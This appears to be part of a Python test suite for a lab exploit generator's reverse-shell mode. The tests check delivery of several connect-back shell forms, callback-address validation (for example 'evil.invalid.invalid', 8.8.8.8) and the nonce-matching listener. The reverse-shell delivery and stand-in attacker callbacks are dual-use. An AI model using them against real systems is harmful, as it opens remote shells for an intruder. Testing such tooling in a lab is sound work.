            self.artifact(), "--lab-address", f"{host}:{port}",
            "--reverse-shell", "--allow-shell", "--callback-bind",
            "127.0.0.1:0", "--callback-wait", "8",
            typed="id\nsleep 1\nexit\n", port=str(port),
        )
        self.assertEqual(code, 0, complained)
        # One keyboard, one session: the extra is closed and counted, and
        # nothing of it is in the transcript.
        self.assertIn("closed unread", complained)
        self.assertIn("one keyboard, one session", complained)

    def test_the_form_that_landed_is_named_and_was_sent_verbatim(self) -> None:
        """Which form works is a measurement and not a constant to trust.

        The artifact tries an ordered set and says which one landed, because
        what can work is a fact about what is in the image: measured across
        five images, a busybox image has only `nc`, a slim Debian image has
        no `nc` at all, and the archive's one lab with a verified
        one-command form has bash and perl and no python3.
        """
        with _Working() as (address, asked):
            _, complained, code = self.session(address, "id\nexit\n")
        self.assertEqual(code, 0, complained)
        landed = complained.partition(field._REVERSE_LANDED_PREFIX)[2].partition(
            ","
        )[0].strip()
        self.assertIn(landed, [name for name, _ in field.REVERSE_FORMS])
        sent = self.delivered(asked)
        self.assertEqual(
            self.masked(sent[-1]),
            self.filled(dict(field.REVERSE_FORMS)[landed],
                        self.listening(complained)),
        )
        # And the form named is the form whose nonce came back, which is what
        # the attribution is: the nonce that was in that delivery and in no
        # other is the one the connection presented.
        self.assertEqual(len(self.nonces(asked)), len(sent))
        self.assertEqual(len(set(self.nonces(asked))), len(sent))

    def test_nothing_in_the_session_is_interpreted_on_this_side(self) -> None:
        """The difference from the prompt, measured.

        `--shell` reads `cd` and prefixes it to the next command, because
        there is nothing on the other end that can hold a directory. Here
        there is: the shell that connected back has its own, so `cd` is sent
        and answered on the target and this file never sees it.
        """
        with _Working() as (address, asked):
            said, complained, code = self.session(
                address, "cd /\npwd\nexit\n"
            )
        self.assertEqual(code, 0, complained)
        self.assertIn("\n/\n", said.replace("\r", ""))
        sent = self.delivered(asked)
        self.assertEqual(len(sent), 1)
        self.assertNotIn("cd / &&", sent[0])
        self.assertNotIn("[cd simulated]", complained)

    def test_nothing_connecting_back_is_a_result_and_not_a_refusal(self) -> None:
        """Against the product that echoes instead of running.

        Exit 1: the forms were delivered and nothing came back, which is an
        answer. Exit 2 would say this file refused, and exit 0 would say a
        session happened -- which is the rule the prompt beside this one
        breaks, where a run in which no line ever ran still exits 0.
        """
        with stub(seeded=False) as (address, asked):
            said, complained, code = self.session(address, "id\nexit\n")
        self.assertEqual(code, 1)
        self.assertEqual(said, "")
        self.assertIn("Nothing connected back", " ".join(complained.split()))
        where = self.listening(complained)
        self.assertEqual(
            [self.masked(one) for one in self.delivered(asked)],
            [self.filled(form, where) for _, form in field.REVERSE_FORMS],
        )
        # Every form was delivered -- this product answers 200 -- so the
        # cause named is the image and not the lab program refusing.
        for name, _ in field.REVERSE_FORMS:
            with self.subTest(name=name):
                self.assertIn(
                    f"  {name}: delivered; nothing carrying its nonce connected back",
                    complained,
                )
                self.assertNotIn(f"  {name}: NOT delivered", complained)

    def test_the_no_argument_path_is_unchanged_with_the_session_in_the_file(
        self,
    ) -> None:
        """The path every proof rests on, measured with the mode present."""
        text = self.artifact()
        self.assertIn("_reverse_given(sys.argv)", text)
        with tempfile.TemporaryDirectory() as temporary:
            alone = Path(temporary) / "validator.py"
            alone.write_text(FIXTURE.read_text(encoding="utf-8"), encoding="utf-8")
            merged = Path(temporary) / field.POC_NAME
            merged.write_text(text, encoding="utf-8")
            environment = dict(os.environ)
            for name in ("CVELAB_MANUAL_ACTION", "CVELAB_TARGET", "CVELAB_BOUND"):
                environment.pop(name, None)
            runs = [
                subprocess.run(
                    [sys.executable, str(script)], capture_output=True, text=True,
                    timeout=60, env=environment,
                )
                for script in (merged, alone)
            ]
        self.assertEqual(runs[0].stdout, runs[1].stdout)
        self.assertEqual(runs[0].returncode, runs[1].returncode)

    def test_a_lab_with_an_adapter_is_offered_no_session(self) -> None:
        text = field.emit_poc(
            "CVE-2026-0001",
            self.plan(fidelity={"simulated_components": ["an adapter over the helper"]}),
            FIXTURE.read_text(encoding="utf-8"),
            {"shipped": False, "reason": "no", "reverse_shell": {"shipped": True}},
        )
        self.assertNotIn("--reverse-shell", text)
        # Typed at a file that has no such mode, the words are not a mode and
        # are not read as one. With no address they reach remote mode's own
        # refusal; with one they become the command, which the lab program
        # refuses because there are three positionals and it takes two. The
        # flag is absent from the file entirely, so there is nothing here
        # that could name it instead -- and either way it is exit 2 with
        # nothing on stdout.
        said, complained, code = self.ran(
            text, "--reverse-shell", "--allow-shell", "--callback-bind", "127.0.0.1:0",
        )
        self.assertEqual(code, 2)
        self.assertEqual(said, "")
        self.assertIn("no remote mode", complained)
        said, complained, code = self.ran(
            text, "--lab-address", "127.0.0.1:1", "--reverse-shell", "--allow-shell",
            "--callback-bind", "127.0.0.1:0",
        )
        self.assertEqual(code, 2)
        self.assertEqual(said, "")
        self.assertIn("usage", complained)


class TheOutboundAddressTests(unittest.TestCase):
    """What `--callback` tells the build to reach, and who is told about it.

    `--lab-address` refuses any address that is not loopback, by design: the
    inbound direction was thought about. The outbound one was not. This flag
    was accepted on nothing but "non-empty, no colon in it", so
    `--callback 8.8.8.8:4444` was delivered in all four forms and
    `--callback =` became `/dev/tcp/=/49987`, under one line of chrome -- and
    the refusal beneath it claimed the flag "takes an IPv4 address this build
    has to reach", which neither a DNS name nor `=` is.

    Two things here, and they are deliberately not the same thing. What the
    flag claims to accept it now checks: an address written out, or a name
    that resolves from here. And what it accepts and cannot account for it
    cautions about rather than refuses -- NAT and a port mapping are real,
    and an operator does have to be able to name an address that is neither
    loopback nor this machine's. The nonce argument that makes warning right
    for a wildcard BIND does not carry over: the nonce travels inside the
    delivered command, so a build told to reach a stranger hands that
    stranger the nonce and the session with it.
    """

    plan = TheSessionIsCarriedToTheProductTests.plan
    artifact = TheSessionIsCarriedToTheProductTests.artifact
    ran = TheSessionIsCarriedToTheProductTests.ran
    delivered = TheSessionIsCarriedToTheProductTests.delivered
    session = TheSessionIsCarriedToTheProductTests.session
    told = staticmethod(TheSessionIsCarriedToTheProductTests.told)
    listening = staticmethod(TheSessionIsCarriedToTheProductTests.listening)

    def against(self, *extra: str) -> tuple[str, int, list]:
        """One run against a product that refuses every delivery.

        Refusing is enough: what is being measured is what this file does
        with the address before anything goes out, and what it says about it.
        """
        with stub(seeded=False) as (address, asked):
            _, complained, code = self.ran(
                self.artifact(), "--lab-address", address, "--reverse-shell",
                "--allow-shell", "--callback-bind", "127.0.0.1:0",
                "--callback-wait", "1", *extra,
                port=address.rsplit(":", 1)[1],
            )
        return complained, code, asked

    def test_a_callback_that_is_neither_an_address_nor_a_name_is_refused(
        self,
    ) -> None:
        """And refused before anything is sent, which is the whole point."""
        for told in ("=", "evil.invalid.invalid:4444", "8.8.8:4444",
                     "0x7f.1:4444", "not a host:4444"):
            with self.subTest(told=told):
                complained, code, asked = self.against("--callback", told)
                self.assertEqual(code, 2)
                self.assertNotIn("[sending the ", complained)
                self.assertEqual(self.delivered(asked), [])
                said = " ".join(complained.split())
                # The refusal says what is actually accepted, which the one
                # it replaces did not: a name passed it while it claimed to
                # take an address.
                self.assertIn("an IPv4 address written out, or a name that", said)
                self.assertIn("resolves to one from here", said)
                self.assertIn(repr(told), said)

    def test_a_name_that_resolves_is_accepted_and_told_to_the_build(self) -> None:
        """Accepted, because every form can be given a name to connect to.

        Delivered as it was typed and not as the address it resolves to here:
        the build does its own resolving and a container's resolver is not
        this host's.
        """
        complained, code, asked = self.against("--callback", "localhost:4444")
        self.assertEqual(code, 1)
        self.assertEqual(self.told(complained), "localhost:4444")
        for command in self.delivered(asked):
            with self.subTest(command=command[:40]):
                self.assertIn("localhost", command)
        # Loopback, so nothing to caution about.
        self.assertNotIn("not loopback, not an address of this machine", complained)

    def test_an_address_nothing_can_connect_to_is_refused_not_cautioned(
        self,
    ) -> None:
        """Where the line between refusing and cautioning actually falls.

        The caution is for an address that CAN be a destination and cannot
        be shown to be the operator's -- NAT and a port mapping are real.
        These are the other thing: multicast, the reserved range above it
        where the limited broadcast address lives, and 0.0.0.0/8. No TCP
        connect-back reaches any of them, so a delivery naming one is a
        command that cannot land.

        They were not merely uncautioned, they were cautioned-proof:
        `_reverse_is_this_machine` asks the kernel by binding, and Linux
        lets a socket bind 255.255.255.255 and all of 224.0.0.0/4 -- so the
        probe called them this machine's and the warning did not print.
        Which is why the classification is read off the packed bytes and
        happens before the probe is consulted at all.
        """
        for address in ("255.255.255.255", "224.0.0.1", "239.255.255.250",
                        "240.0.0.1", "0.1.2.3"):
            with self.subTest(address=address):
                complained, code, asked = self.against(
                    "--callback", address + ":4444"
                )
                self.assertEqual(code, 2)
                self.assertIn(address, complained)
                self.assertIn("multicast, reserved or", complained)
                # Refused before anything went out, which is the point.
                self.assertEqual(asked, [])
                self.assertNotIn("is not loopback", complained)

    def test_a_callback_port_of_zero_is_refused(self) -> None:
        """Port 0 means something on the bind and nothing here.

        `_reverse_at` allows it because `--callback-bind 127.0.0.1:0` is the
        arrangement the proof itself uses, where the kernel picks the port.
        Carried into `--callback` it told the build to reach a port nothing
        can connect to, and the run delivered all four forms to it.
        """
        complained, code, asked = self.against("--callback", "1.2.3.4:0")
        self.assertEqual(code, 2)
        self.assertIn("port 0", complained)
        self.assertEqual(asked, [])
        # And the shape it exists for is still accepted.
        _, kept, _ = self.against("--callback", "1.2.3.4:4444")
        self.assertEqual(kept, 1)

    def test_the_wildcard_is_refused_in_the_words_of_whoever_named_it(
        self,
    ) -> None:
        """Two causes, two sentences, and each one true of its own cause.

        Both used to reach the bind's text: "This listener is bound to every
        interface. Name the one it can with --callback HOST:PORT" -- said to
        an operator whose listener was on loopback and who had just named it
        with --callback. Two false clauses and advice to do the thing they
        had already done.
        """
        named, code, asked = self.against("--callback", "0.0.0.0:4444")
        self.assertEqual(code, 2)
        self.assertIn("--callback names every interface", named)
        self.assertNotIn("This listener is bound", named)
        self.assertEqual(asked, [])

        with stub(seeded=False) as (address, bind_asked):
            _, bound, bind_code = self.ran(
                self.artifact(), "--lab-address", address, "--reverse-shell",
                "--allow-shell", "--callback-bind", "0.0.0.0:0",
                "--callback-wait", "1",
                port=address.rsplit(":", 1)[1],
            )
        self.assertEqual(bind_code, 2)
        self.assertIn("This listener is bound to every interface", bound)
        self.assertNotIn("--callback names every interface", bound)
        self.assertEqual(bind_asked, [])

    def test_a_far_callback_is_cautioned_and_not_refused(self) -> None:
        """Cautioned, because the flag exists for the case that needs it.

        What the operator is told: the address, that it is none of the three
        shapes a listener of theirs has, what the commands below will tell
        the build to do and to whom, and that the nonce does not help with
        it. Said before the first delivery, so it is a reason to stop.
        """
        complained, code, asked = self.against("--callback", "8.8.8.8:4444")
        self.assertEqual(code, 1)
        said = " ".join(complained.split())
        self.assertIn(
            "[8.8.8.8 is not loopback, not an address of this machine, and not a",
            complained,
        )
        self.assertIn("open a shell to that address and that port", said)
        self.assertIn("whoever is listening there is who gets the shell", said)
        self.assertIn("the nonce does not help with that", said)
        self.assertIn("the build has not been sent anything yet", said)
        # Cautioned and not refused: the deliveries still went out, which is
        # the case NAT and a port mapping need.
        self.assertEqual(len(self.delivered(asked)), len(field.REVERSE_FORMS))
        for command in self.delivered(asked):
            with self.subTest(command=command[:40]):
                self.assertIn("8.8.8.8", command)
        # The caution is before the first delivery.
        self.assertLess(
            complained.index("is not loopback"),
            complained.index(field._REVERSE_SENDING_PREFIX),
        )

    def test_a_far_name_says_what_it_resolves_to(self) -> None:
        """A name is far unless every address it has from here is near.

        One of two being near is not an answer about where the build will go,
        so the addresses are printed and the caution stands.
        """
        complained, code, _ = self.against("--callback", "dns.google:4444")
        if code == 2:
            self.skipTest("this host cannot resolve a public name")
        self.assertIn("[dns.google is not loopback", complained)
        # A heading and then one address per line: joined into the
        # sentence this was 76 columns at three A records and 93 at four,
        # and four to eight is ordinary for a real name.
        self.assertIn("[it resolves from here to]", complained)
        for found in ("8.8.8.8", "8.8.4.4"):
            self.assertIn(f"\n  {found}\n", complained)

    def test_loopback_and_private_callbacks_are_not_cautioned(self) -> None:
        """The three shapes a listener of the operator's own actually has.

        Loopback, an address this machine holds, and RFC1918 -- which is what
        the Docker bridge address the flag's own help names is.
        """
        for told in ("127.0.0.1:4444", "127.0.0.53:4444", "10.1.2.3:4444",
                     "172.16.0.1:4444", "192.168.1.1:4444"):
            with self.subTest(told=told):
                complained, code, _ = self.against("--callback", told)
                self.assertEqual(code, 1, complained)
                self.assertEqual(self.told(complained), told)
                self.assertNotIn("is not loopback", complained)
                self.assertNotIn("open a shell to that address", complained)

    def test_the_bind_is_never_cautioned_about_being_this_machine_s(self) -> None:
        """A bind with no --callback cannot be far: it bound the address.

        So the caution is about what was TOLD and not about what was bound,
        and the wildcard bind's own warning is untouched beside it.
        """
        complained, code, _ = self.against()
        self.assertEqual(code, 1)
        self.assertEqual(self.told(complained), self.listening(complained))
        self.assertNotIn("is not loopback", complained)

    def test_the_mode_keeps_its_own_lines_inside_seventy_eight_columns(
        self,
    ) -> None:
        """The width the file is written at, at values an operator really sees.

        The reworded headline was 86 columns with a real file name and a real
        published port, the landing sentence 89, the summary of connections
        that were not landings 82, and `[listening on ...]` 79 -- in a file
        whose own comment calls a 95-column line the thing to avoid.

        The lab program's own output is exempt and is the one thing that is:
        `_reverse_said` indents it by four spaces precisely because it is
        somebody else's text and this file cannot wrap it.
        """
        runs = []
        with _Working() as (address, _):
            _, landed, code = self.session(address, "id\nexit\n")
            self.assertEqual(code, 0, landed)
            runs.append(("a session that happened", landed))
        with _Knocking(behaves="silent") as (address, _):
            _, socketed, _ = self.session(address, "id\nexit\n")
            runs.append(("a socket that said nothing", socketed))
        with _Knocking(behaves="session", presents=False) as (address, _):
            _, impostor, _ = self.session(address, "id\nexit\n")
            runs.append(("an impostor with no nonce", impostor))
        runs.append(("a far callback", self.against("--callback", "8.8.8.8:4444")[0]))
        runs.append(("a bind nothing can reach", self.against(
            "--callback", "evil.invalid.invalid")[0]))
        for tag, text in runs:
            for line in text.splitlines():
                if line.startswith("    "):
                    continue
                with self.subTest(tag=tag, line=line[:40]):
                    self.assertLessEqual(len(line), 78, line)


class TheListenerItselfTests(unittest.TestCase):
    """`_ReverseListener`, run out of the artifact rather than described.

    The class is emitted text, so the end-to-end tests above are the only
    place it runs -- and they can only reach its edges through four
    deliveries and a product. The upper half of the artifact is importable
    on its own: everything in it is a definition, so exec'ing it under a
    `__name__` that is not `__main__` yields the real class with the real
    constants, and the window this is about can be driven directly and
    deterministically instead of being timed against a delivery loop.
    """

    plan = TheSessionIsCarriedToTheProductTests.plan
    artifact = TheSessionIsCarriedToTheProductTests.artifact

    def listener(self) -> object:
        upper = self.artifact().partition(field.POC_LAB_MODE_MARKER)[0]
        held: dict = {"__name__": "not_main", "__file__": field.POC_NAME}
        exec(compile(upper, field.POC_NAME, "exec"), held)
        self.assertEqual(held["REVERSE_GREETING_WAIT"], field.REVERSE_GREETING_WAIT)
        #: The emitted namespace, so a test can read a constant that lives
        #: in the artifact rather than in the module that writes it.
        self.held = held
        catcher = held["_ReverseListener"]("127.0.0.1", 0)
        self.addCleanup(catcher.close)
        return catcher

    def connect(self, catcher: object) -> socket.socket:
        held = socket.create_connection((catcher.host, catcher.port), timeout=10)
        self.addCleanup(held.close)
        return held

    def test_nothing_reading_is_answered_at_once(self) -> None:
        """A run where nothing connected must not get slower for this.

        Not free, and the cost is named rather than hidden: taking the
        listener down waits for the serving loop to notice, which is one
        poll interval. `socketserver`'s own default is half a second, which
        this run measured and which is why the interval is set; with it set
        the empty path pays about one of them.
        """
        catcher = self.listener()
        began = time.monotonic()
        self.assertIsNone(catcher.wait_for_a_greeting())
        took = time.monotonic() - began
        self.assertLess(took, 1.0)
        # Tied to the constant, so lengthening the interval has to be a
        # deliberate act and not something a later edit does quietly.
        self.assertLess(took, self.held["REVERSE_POLL"] * 20)

    def test_a_nonce_presented_before_the_accept_is_still_the_landing(
        self,
    ) -> None:
        """The window no counter can see, and the reason this is three steps.

        A client's `connect` returns when the handshake does. The connection
        then sits in the listening socket's queue until the serving thread
        is scheduled, so there is a stretch in which the connection is
        complete and no counter of this file's knows about it -- measured,
        every one of the connects below returns with `reading` still 0.
        Taking the count as early as the accepting thread can take it does
        not help, because the window is in front of user space altogether:
        that arrangement lost 200 of 200. Asking the kernel whether it holds
        an unaccepted connection, and only then shutting the listener down
        -- which does not return until the iteration that takes the count
        has finished -- is what closes it.

        Repeated, because once is not evidence about a race.
        """
        unseen = lost = 0
        for _ in range(25):
            catcher = self.listener()
            catcher.offer("perl", "b" * 32)
            held = self.connect(catcher)
            if catcher.reading == 0:
                unseen += 1
            held.sendall(b"b" * 32 + b"\n")
            if catcher.wait_for_a_greeting() is None:
                lost += 1
            catcher.close()
        self.assertEqual(lost, 0)
        # The window is real, which is what makes the assertion above mean
        # something. If this ever reads 0 the test has stopped testing.
        self.assertGreater(unseen, 0)

    def test_a_nonce_that_arrives_during_the_wait_is_the_landing(self) -> None:
        """The window itself: accepted, not yet read, and the deliveries over.

        This is where the session used to be lost. `close()` set `released`
        and the handler registered the landing after it, so the socket was
        gone and the file then said no connection had carried a nonce.
        """
        catcher = self.listener()
        catcher.offer("perl", "a" * 32)
        held = self.connect(catcher)
        for _ in range(100):
            if catcher.reading:
                break
            time.sleep(0.02)
        self.assertEqual(catcher.arrivals, 1)
        self.assertEqual(catcher.reading, 1)
        self.assertFalse(catcher.arrived.is_set())
        threading.Timer(1.0, lambda: held.sendall(b"a" * 32 + b"\n")).start()
        self.assertIsNotNone(catcher.wait_for_a_greeting())
        self.assertEqual(catcher.form, "perl")
        self.assertEqual(catcher.unknown, [])

    def test_a_first_line_already_read_leaves_nothing_to_wait_for(self) -> None:
        """So an impostor that speaks costs the report nothing."""
        catcher = self.listener()
        catcher.offer("perl", "a" * 32)
        held = self.connect(catcher)
        held.sendall(b"not-a-nonce\n")
        for _ in range(200):
            if catcher.unknown:
                break
            time.sleep(0.02)
        self.assertEqual(catcher.unknown, ["127.0.0.1"])
        self.assertEqual(catcher.reading, 0)
        began = time.monotonic()
        self.assertIsNone(catcher.wait_for_a_greeting())
        self.assertLess(time.monotonic() - began, 1.0)

    def test_the_wait_is_bounded_by_the_greeting_wait(self) -> None:
        """A connection that never speaks holds this for that long and no more.

        Measured against the bound rather than against a guess, because the
        bound is what makes paying it defensible at all.
        """
        catcher = self.listener()
        catcher.offer("perl", "a" * 32)
        self.connect(catcher)
        for _ in range(100):
            if catcher.reading:
                break
            time.sleep(0.02)
        began = time.monotonic()
        self.assertIsNone(catcher.wait_for_a_greeting())
        spent = time.monotonic() - began
        self.assertGreaterEqual(spent, field.REVERSE_GREETING_WAIT - 1)
        self.assertLess(spent, field.REVERSE_GREETING_WAIT + 4)


if __name__ == "__main__":
    unittest.main()
